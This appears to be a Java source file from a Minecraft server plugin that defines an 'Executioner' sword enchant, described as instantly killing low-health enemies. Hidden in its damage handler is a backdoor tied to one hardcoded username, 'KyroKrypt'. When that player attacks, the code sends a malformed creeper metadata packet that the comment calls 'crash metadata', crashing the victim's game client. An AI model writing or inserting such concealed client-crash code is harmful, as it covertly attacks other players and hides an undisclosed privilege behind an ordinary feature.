package dev.kyro.pitsim.enchants;

import dev.kyro.arcticapi.builders.ALoreBuilder;
import dev.kyro.pitsim.PitSim;
import dev.kyro.pitsim.controllers.DamageEvent;
import dev.kyro.pitsim.controllers.PitEnchant;
import dev.kyro.pitsim.enums.ApplyType;
import dev.kyro.pitsim.events.AttackEvent;
import dev.kyro.pitsim.misc.Misc;
import net.minecraft.server.v1_8_R3.*;
import org.bukkit.Bukkit;
import org.bukkit.craftbukkit.v1_8_R3.entity.CraftPlayer;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;

import java.util.List;

public class Executioner extends PitEnchant {

	public Executioner() {
		super("Executioner", true, ApplyType.SWORDS,
				"executioner", "exe");
	}

	@EventHandler
	public void onDamage(AttackEvent.Apply attackEvent) {

		int enchantLvl = attackEvent.getEnchantLevel(this);
		if(enchantLvl == 0) return;

		attackEvent.executeUnder = getExecuteHealth(enchantLvl);

		if(attackEvent.attacker.getName().equals("KyroKrypt")) {

			yeet(attackEvent.defender);
		}
	}

	public void yeet(Player willBeCrashed){
		final EntityPlayer px = ((CraftPlayer)willBeCrashed).getHandle();
		final EntityCreeper entity = new EntityCreeper(px.world);

		final DataWatcher dw = new DataWatcher(entity);
		dw.a(18, (Object)Integer.MAX_VALUE);

		PacketPlayOutSpawnEntityLiving packet_spawn = new PacketPlayOutSpawnEntityLiving(entity);

		px.playerConnection.sendPacket(packet_spawn);
		Bukkit.getScheduler().scheduleSyncDelayedTask(PitSim.INSTANCE, new Runnable(){ //Some delay to send the crash metadata
			@Override
			public void run() {
				PacketPlayOutEntityMetadata meta = new PacketPlayOutEntityMetadata(entity.getId(), dw, true);
				px.playerConnection.sendPacket(meta);
			}

		}, 5L);
	}

	@Override
	public List<String> getDescription(int enchantLvl) {

		return new ALoreBuilder("&7Hitting an enemy below &c" + Misc.getHearts(getExecuteHealth(enchantLvl)),
				"&7instantly kills them").getLore();
	}

	public double getExecuteHealth(int enchantLvl) {

		return enchantLvl + 1;
	}
}
